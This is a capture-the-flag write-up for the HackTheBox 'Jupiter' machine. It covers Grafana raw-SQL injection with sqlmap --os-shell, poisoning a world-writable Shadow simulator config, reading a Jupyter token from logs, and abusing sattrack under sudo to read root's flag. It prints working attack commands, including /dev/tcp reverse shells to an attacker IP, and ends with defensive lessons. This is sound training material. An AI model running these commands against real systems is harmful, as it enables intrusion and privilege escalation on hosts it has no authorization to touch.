---
title: "Jupiter"
date: 2023-07-08
type: docs
tags:
  - htb
  - linux
  - medium
  - vhost-fuzzing
  - grafana
  - postgresql
  - sqli
  - stacked-queries
  - sqlmap
  - shadow-simulator
  - writable-config
  - jupyter
  - pspy
  - sudo
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu 22.04, nginx 1.18), **Difficulty:** Medium, **Released:** 2023-07-08, **IP:** `10.10.11.216` , `jupiter.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. A vhost sweep finds `kiosk.jupiter.htb` running **Grafana**. Its `/api/ds/query` proxies raw SQL to PostgreSQL, and the `rawSql` field allows **stacked queries**.
2. `sqlmap --os-shell` on the captured request gives a shell as **`postgres`**.
3. `/dev/shm/network-simulation.yml` is world writable and consumed on a schedule by **`juno`** via the **Shadow** network simulator. Poison a `process` entry to run a reverse shell. Now **`juno`**.
4. `juno` can read `/opt/solar-flares/`, which holds the log for a **Jupyter Notebook** running as **`jovian`**. The log contains the auth token. Use it to run Python in the notebook. Now **`jovian`**.
5. `jovian` may `sudo /usr/local/bin/sattrack` (NOPASSWD). It reads `config.json` from the working directory and writes downloaded "TLE source" files to a path you choose, so point `tlesources` at `file:///root/root.txt` (or replace the binary, which `jovian` can also write). Root.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| Grafana datasource | injected, no login needed |
| Jupyter token | from `/opt/solar-flares/*.log` |
| `user.txt` | `/home/juno/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

Jupiter is a four hop box with a science theme, and every hop is "someone left a job running that trusts a file I can write". The Grafana SQLi is the interesting foothold: Grafana lets a dashboard send arbitrary SQL to a datasource, and if you can reach `/api/ds/query` unauthenticated (anonymous org access is on here) you have a Postgres shell. Then a **Shadow simulator** config in `/dev/shm`, a **Jupyter** token sitting in a log, and a **satellite tracking tool** run via `sudo` that downloads files to attacker chosen paths. It is a great box for the habit of running `pspy` and `ss -tlnp` the moment you land and asking "what runs this, and can I influence its input".

Related Grafana / datasource SQLi: unique here, but see [PC](/writeups/hackthebox/linux/easy/pc/) and [Usage](/writeups/hackthebox/linux/easy/usage/) for SQLi via a request file. Related writable config consumed by a cron: [Inject](/writeups/hackthebox/linux/easy/inject/), [Interface](/writeups/hackthebox/linux/medium/interface/), [mkingdom](/writeups/tryhackme/linux/easy/mkingdom/). Related Jupyter: [Weasel](/writeups/tryhackme/windows/hard/weasel/) (THM).

---

## Full Walkthrough

### Web, Grafana SQL injection

The main site did not offer much to work with on its own, so as usual my next step was to check whether there was more to the host than the one vhost nmap had already shown me:

```bash
ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -c \
  -u http://jupiter.htb/ -H "Host: FUZZ.jupiter.htb" --mc all --fs 178
```

```console
kiosk   [Status: 200, Size: 34390]
```

`kiosk.jupiter.htb` is Grafana with an anonymous "public" dashboard. Capture one of its panel queries:

```http
POST /api/ds/query HTTP/1.1
Host: kiosk.jupiter.htb
Content-Type: application/json

{"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},
"rawSql":"select name from moons where parent = 'Saturn' order by name desc;",
"format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":1223}],
"from":"now-6h","to":"now"}
```

<div class="callout callout-note">

**Why this is injectable**

Grafana's Postgres datasource sends `rawSql` to the database more or less verbatim (it is a feature, "raw editor mode"). There is no parameterisation because the panel author is trusted. But `/api/ds/query` here does not require auth, so *you* are the panel author. Postgres allows **stacked queries** (`; SELECT pg_sleep(5)--`), which is what makes `--os-shell` possible. Feed the whole request to sqlmap as a `-r` file.

</div>

```bash
sqlmap -r sql.req --batch --no-cast --level 1 --risk 1 --dbs
```

```console
Parameter: JSON rawSql ((custom) POST)
    Type: stacked queries
back-end DBMS: PostgreSQL
```

### Foothold, sqlmap os-shell

```bash
sqlmap -r sql.req --os-shell --threads=10
```

```console
os-shell> bash -c 'sh -i >& /dev/tcp/10.10.14.77/9001 0>&1'
```

Shell as **`postgres`**.

<div class="callout callout-note">

**How `--os-shell` works on Postgres**

sqlmap creates a function that runs `COPY (SELECT '') TO PROGRAM '<cmd>'` (or uses a UDF), which executes `<cmd>` as the database OS user. Postgres `COPY ... TO PROGRAM` requires superuser, and the Grafana datasource connects as one here, so it works.

</div>

### Internal enumeration

```console
$ ss -tlnp
127.0.0.1:8888   # Jupyter Notebook (token needed)
127.0.0.1:3000   # Grafana
127.0.0.1:5432   # postgres

$ ls -la /dev/shm
-rw-rw-rw- 1 juno juno ... /dev/shm/network-simulation.yml    # world writable
```

`pspy` shows `juno` running `shadow` against that YAML every couple of minutes, which is exactly the pattern I was hoping to find: a privileged-ish user repeatedly consuming a file I can write. If `juno` owns the file's contents and I own the file, I own whatever `juno` does next.

### postgres to juno, poisoning the Shadow config

`network-simulation.yml` defines a set of simulated hosts and the processes each one runs when Shadow executes the scenario. Since `juno` is the one invoking Shadow against this file, any process I add gets launched as `juno`. I appended an entry that copies and setuids a shell:

```yaml
hosts:
  attacker:
    network_node_id: 0
    processes:
      - path: /bin/bash
        args: -c "cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash"   # runs as juno
        start_time: 3s
```

A couple of minutes later the cron-driven Shadow run picked up my edit, and `/tmp/rootbash -p` handed me a shell as `juno` (a reverse shell or a dropped SSH key would work just as well here). `user.txt` sits in `/home/juno`, so that closed out the first flag.

### juno to jovian, a token sitting in a log

With a `juno` shell in hand, I went back to the `ss -tlnp` output from earlier: port `8888` was a Jupyter Notebook instance, and Jupyter normally requires a token to authenticate. `juno` turned out to have read access to `/opt/solar-flares/`, and grepping the logs there for the startup URL handed me the token on a plate:

```bash
grep -r 'token=' /opt/solar-flares/*.log
```

I tunneled port `8888` back to my machine (chisel works fine here, SSH local forwarding is just as good) and opened `http://127.0.0.1:8888/?token=<token>` in a browser. From a fresh notebook, running Python inside the kernel is code execution as whoever started the Jupyter process:

```python
import os
os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.77/9002 0>&1'")
```

That kernel runs as **`jovian`**, so I had my third user on the box.

### jovian to root, an attacker-chosen download path in sattrack

`sudo -l` as `jovian` gave me the last piece straight away:

```console
jovian@jupiter:~$ sudo -l
User jovian may run the following commands on jupiter:
    (ALL) NOPASSWD: /usr/local/bin/sattrack
```

`sattrack` is a satellite-tracking utility that reads a `config.json` out of its current working directory and then downloads every URL listed under `tlesources` into a path I also control (`tlefilepath` / `outputdir`). A tool that lets an unprivileged caller pick both the source URL scheme and the destination path, and then runs as root via `sudo`, is basically an arbitrary file read (or write) waiting to be used. I pointed a source at the root flag using the `file://` scheme:

```json
{
  "tlefile": "/tmp/tle.txt",
  "tlepath": "/tmp/",
  "mapfile": "/usr/local/share/sattrack/map.json",
  "texturefile": "/usr/local/share/sattrack/earth.png",
  "tlesources": ["file:///root/root.txt"],
  "updatePeriod": 1000,
  ...
}
```

```bash
cd /tmp && sudo /usr/local/bin/sattrack
cat /tmp/root.txt        # or whatever the tle output path resolves to
```

`cat /tmp/root.txt` returns the 32-character flag for this instance. (An even blunter route exists too: `jovian` has write access to `/usr/local/bin/sattrack` itself, so overwriting the binary outright and running it under `sudo` works just as well if the config-based read ever gets patched.)

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/juno/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **Disable anonymous access on Grafana** and never expose a datasource that connects as a database superuser. Raw SQL mode plus anon access plus superuser is unauthenticated RCE.
- **`/dev/shm` and `/tmp` are shared.** Do not read job configs from world writable paths. Own the file as the job user with `0600`.
- **Do not log secrets.** The Jupyter token in a world-groupreadable log is the whole juno to jovian hop. Use `--IdentityProvider.token` from an env var and restrict log perms.
- **`sudo` on a tool that reads a config from CWD** is privesc. The tool should use a fixed absolute config path owned by root.
- **`pspy` and `ss -tlnp` first.** Three of the four hops here are invisible to `sudo -l` alone.

---

## Related Writeups

- **SQLi via a saved request / os-shell:** [PC](/writeups/hackthebox/linux/easy/pc/), [Usage](/writeups/hackthebox/linux/easy/usage/), [Monitored](/writeups/hackthebox/linux/medium/monitored/)
- **Writable config consumed by a scheduled job:** [Inject](/writeups/hackthebox/linux/easy/inject/), [Interface](/writeups/hackthebox/linux/medium/interface/), [mkingdom](/writeups/tryhackme/linux/easy/mkingdom/)
- **Token or secret sitting in a log / file:** [Cat](/writeups/hackthebox/linux/medium/cat/), [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/)
- **`sudo` on a tool that trusts CWD / its own config:** [Code](/writeups/hackthebox/linux/easy/code/), [Bagel](/writeups/hackthebox/linux/medium/bagel/)

## References

- HTB Jupiter (0xdf) <https://0xdf.gitlab.io/2023/10/21/htb-jupiter.html>
- HTB Jupiter (Eric Hogue) <https://erichogue.ca/2023/10/HTB/Jupiter>
- Shadow network simulator <https://shadow.github.io/>
- Grafana datasource proxy <https://grafana.com/docs/grafana/latest/developers/http_api/data_source/>
- Final privilege escalation steps cross-referenced against public writeups for this box.
